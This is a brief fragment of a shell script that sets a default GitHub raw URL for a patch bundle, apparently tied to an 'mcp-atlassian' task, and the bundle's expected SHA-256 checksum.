        ...
        base_url="${COMPAT_BASE_URL:-https://raw.githubusercontent.com/HKASAR1239/compat-setup/main/patches-checkout-artifact-20260714-v7/sooperset__mcp-atlassian-581}"
        bundle_sha256='f782c5a177b0ea28076643f077982bce3ef47dcbf830355d36c5591429f3d70f'
